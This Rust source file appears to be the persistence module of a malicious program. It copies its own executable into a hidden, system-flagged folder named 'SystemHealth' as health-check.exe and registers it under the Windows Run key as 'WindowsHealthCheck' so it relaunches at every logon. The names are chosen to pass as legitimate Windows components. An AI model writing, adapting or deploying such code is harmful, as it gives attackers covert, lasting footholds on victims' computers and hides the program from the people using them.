use crate::recovery::settings::RecoveryControl;
use directories::BaseDirs;
use std::env;
use std::fs;
use std::path::Path;
use tracing::{debug, error, info, warn};
use winreg::{enums::*, RegKey};

pub async fn install_persistence() {
    if !RecoveryControl::global().persistence_enabled() {
        debug!("persistence is disabled");
        return;
    }

    if let Err(err) = install_persistence_impl().await {
        error!(error = ?err, "failed to install persistence");
    }
}

async fn install_persistence_impl() -> Result<(), Box<dyn std::error::Error>> {
    let current_exe = env::current_exe()?;
    let base_dirs = BaseDirs::new().ok_or("failed to determine base directories")?;

    let data_dir = base_dirs.data_local_dir().join("SystemHealth");
    if !data_dir.exists() {
        fs::create_dir_all(&data_dir)?;
        #[cfg(target_os = "windows")]
        {
            use std::process::Command;
            let _ = Command::new("attrib")
                .args(&["+h", "+s", data_dir.to_string_lossy().as_ref()])
                .output();
        }
    }

    let target_exe = data_dir.join("health-check.exe");

    if current_exe == target_exe {
        debug!("running from persistence location");
        ensure_registry_key(&target_exe)?;
        return Ok(());
    }

    info!(
        current = %current_exe.display(),
        target = %target_exe.display(),
        "installing persistence artifact"
    );

    match fs::copy(&current_exe, &target_exe) {
        Ok(_) => {
            #[cfg(target_os = "windows")]
            {
                use std::process::Command;
                let _ = Command::new("attrib")
                    .args(&["+h", "+s", target_exe.to_string_lossy().as_ref()])
                    .output();
            }
        },
        Err(err) => {
            warn!(error = %err, "failed to copy executable (might be running)");
            if !target_exe.exists() {
                return Err(err.into());
            }
        }
    }

    ensure_registry_key(&target_exe)?;
    Ok(())
}

fn ensure_registry_key(path: &Path) -> Result<(), Box<dyn std::error::Error>> {
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let run_key = hkcu.open_subkey_with_flags(
        r"Software\Microsoft\Windows\CurrentVersion\Run",
        KEY_SET_VALUE,
    )?;

    let app_name = "WindowsHealthCheck";
    run_key.set_value(app_name, &path.to_string_lossy().as_ref())?;
    
    debug!("registry run key set");
    Ok(())
}
